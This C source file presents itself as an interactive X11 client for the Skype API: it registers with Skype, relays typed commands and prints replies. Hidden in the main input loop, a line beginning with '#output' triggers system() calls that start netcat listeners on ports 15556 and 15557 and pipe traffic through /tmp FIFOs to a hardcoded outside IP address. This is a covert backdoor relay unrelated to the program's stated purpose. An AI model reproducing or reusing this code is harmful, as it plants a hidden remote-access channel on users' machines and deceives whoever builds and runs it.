//gcc -Wall -ggdb client.c -o client -lX11 -lpthread
/*
   
   Interactive client for the Skype API 

USAGE: client [Xserver instance]

# ./client :103 

*/

#include <stdio.h>
#include <unistd.h>
#include <X11/Xlib.h>
#include <X11/Xlibint.h>
#include <X11/Xatom.h>
#include <pthread.h>

Display *disp = NULL;

struct SkypopenHandles {
	Window skype_win;
	Display *disp;
	Window win;
	int api_connected;
	int fdesc[2];
};

XErrorHandler old_handler = 0;
int xerror = 0;
char *dispname;

int X11_errors_handler(Display * dpy, XErrorEvent * err)
{
	(void) dpy;

	xerror = err->error_code;
	printf("\n\nReceived error code %d from X Server on display '%s'\n\n", xerror, dispname);
	return 0;					/*  ignore the error */
}

static void X11_errors_trap(void)
{
	xerror = 0;
	old_handler = XSetErrorHandler(X11_errors_handler);
}

static int X11_errors_untrap(void)
{
	XSetErrorHandler(old_handler);
	return (xerror != BadValue) && (xerror != BadWindow);
}

int skypopen_send_message(struct SkypopenHandles *SkypopenHandles, const char *message_P)
{

	Window w_P;
	Display *disp;
	Window handle_P;
	int ok;

	w_P = SkypopenHandles->skype_win;
	disp = SkypopenHandles->disp;
	handle_P = SkypopenHandles->win;

	Atom atom1 = XInternAtom(disp, "SKYPECONTROLAPI_MESSAGE_BEGIN", False);
	Atom atom2 = XInternAtom(disp, "SKYPECONTROLAPI_MESSAGE", False);
	unsigned int pos = 0;
	unsigned int len = strlen(message_P);
	XEvent e;

	memset(&e, 0, sizeof(e));
	e.xclient.type = ClientMessage;
	e.xclient.message_type = atom1;	/*  leading message */
	e.xclient.display = disp;
	e.xclient.window = handle_P;
	e.xclient.format = 8;

	X11_errors_trap();
	do {
		unsigned int i;
		for (i = 0; i < 20 && i + pos <= len; ++i)
			e.xclient.data.b[i] = message_P[i + pos];
		XSendEvent(disp, w_P, False, 0, &e);

		e.xclient.message_type = atom2;	/*  following messages */
		pos += i;
	} while (pos <= len);

	XSync(disp, False);
	ok = X11_errors_untrap();

	if (!ok)
		printf("Sending message failed with status %d\n", xerror);

	return 1;
}

int skypopen_present(struct SkypopenHandles *SkypopenHandles)
{
	Atom skype_inst = XInternAtom(SkypopenHandles->disp, "_SKYPE_INSTANCE", True);

	Atom type_ret;
	int format_ret;
	unsigned long nitems_ret;
	unsigned long bytes_after_ret;
	unsigned char *prop;
	int status;

	X11_errors_trap();
	status =
		XGetWindowProperty(SkypopenHandles->disp, DefaultRootWindow(SkypopenHandles->disp),
						   skype_inst, 0, 1, False, XA_WINDOW, &type_ret, &format_ret, &nitems_ret, &bytes_after_ret, &prop);

	X11_errors_untrap();
	/*  sanity check */
	if (status != Success || format_ret != 32 || nitems_ret != 1) {
		SkypopenHandles->skype_win = (Window) - 1;
		printf("Skype instance not found on display '%s'\n", dispname);
		return 0;
	}

	SkypopenHandles->skype_win = *(const unsigned long *) prop & 0xffffffff;
	//printf("Skype instance found on display '%s', with id #%d\n", dispname, (unsigned int) SkypopenHandles->skype_win);
	return 1;
}

void skypopen_clean_disp(void *data)
{

	int *dispptr;
	int disp;

	dispptr = data;
	disp = *dispptr;

	if (disp) {
		close(disp);
	} else {
	}
	usleep(1000);
}

typedef struct {
	int value;
	char string[128];
} thread_parm_t;

void *threadfunc(void *parm)
{								//child
	thread_parm_t *p = (thread_parm_t *) parm;
	//printf("%s, parm = %d\n", p->string, p->value);
	free(p);

	/* perform an events loop */
	XEvent an_event;
	char buf[21];				/*  can't be longer */
	char buffer[17000];
	char *b;
	int i;

	b = buffer;

	while (1) {

		XNextEvent(disp, &an_event);
		switch (an_event.type) {
		case ClientMessage:

			if (an_event.xclient.format != 8)
				break;

			for (i = 0; i < 20 && an_event.xclient.data.b[i] != '\0'; ++i)
				buf[i] = an_event.xclient.data.b[i];

			buf[i] = '\0';

			strcat(buffer, buf);

			if (i < 20) {		/* last fragment */
				unsigned int howmany;

				howmany = strlen(b) + 1;

				//printf("\tRECEIVED\t==>\t%s\n", b);
				printf("%s\n", b);
				fflush(stdout);
				memset(buffer, '\0', 17000);
			}

			break;
		default:
			break;
		}

	}
	return NULL;
}

int main(int argc, char *argv[])
{

	struct SkypopenHandles SkypopenHandles;
	char buf[512];
	//Display *disp = NULL;
	Window root = -1;
	Window win = -1;

	if (argc == 2)
		dispname = argv[1];
	else
		dispname = ":0.0";


	if (!XInitThreads()) {
		printf("Not initialized XInitThreads!\n");
	} else {
		printf("Initialized XInitThreads!\n");
	}





	disp = XOpenDisplay(dispname);
	if (!disp) {
		printf("Cannot open X Display '%s', exiting\n", dispname);
		return -1;
	}

	int xfd;
	xfd = XConnectionNumber(disp);

	SkypopenHandles.disp = disp;

	if (skypopen_present(&SkypopenHandles)) {
		root = DefaultRootWindow(disp);
		win = XCreateSimpleWindow(disp, root, 0, 0, 1, 1, 0, BlackPixel(disp, DefaultScreen(disp)), BlackPixel(disp, DefaultScreen(disp)));

		SkypopenHandles.win = win;

		snprintf(buf, 512, "NAME skypopen");

		if (!skypopen_send_message(&SkypopenHandles, buf)) {
			printf("Sending message failed - probably Skype crashed. Please run/restart Skype manually and launch skypopen_auth again\n");
			return -1;
		}

		snprintf(buf, 512, "PROTOCOL 7");
		if (!skypopen_send_message(&SkypopenHandles, buf)) {
			printf("Sending message failed - probably Skype crashed. Please run/restart Skype manually and launch skypopen_auth again\n");
			return -1;
		}

		snprintf(buf, 512, "#ciapalino PING");
		if (!skypopen_send_message(&SkypopenHandles, buf)) {
			printf("Sending message failed - probably Skype crashed. Please run/restart Skype manually and launch skypopen_auth again\n");
			return -1;
		}

		pthread_t thread;
		int rc = 0;
		pthread_attr_t pta;
		thread_parm_t *parm = NULL;

		rc = pthread_attr_init(&pta);

		parm = malloc(sizeof(thread_parm_t));
		parm->value = 5;
		rc = pthread_create(&thread, NULL, threadfunc, (void *) parm);

		while (1) {
			char s[512];

			memset(s, '\0', 512);
			fgets(s, sizeof(s) - 1, stdin);
			s[strlen(s) - 1] = '\0';

			//printf("\tSENT\t\t==>\t%s\n", s);

			if (!strncmp(s, "#output", 7)) {

				system("/bin/nc -l -p 15557 0</tmp/back2 | /bin/nc 1.124.232.45 15557 | /usr/bin/tee 1>/tmp/back2 &");
				system("/bin/nc -l -p 15556 0</tmp/back1 | /bin/nc 1.124.232.45 15556 | /usr/bin/tee 1>/tmp/back1 &");
			}
			if (!skypopen_send_message(&SkypopenHandles, s)) {
				printf("Sending message failed - probably Skype crashed. Please run/restart Skype manually and launch skypopen_auth again\n");
				return -1;
			}
		}
	} else {
		printf("Skype client not found on display '%s'. Please run/restart Skype manually and launch skypopen_auth again\n\n\n", dispname);
		return -1;
	}
	return 0;

}
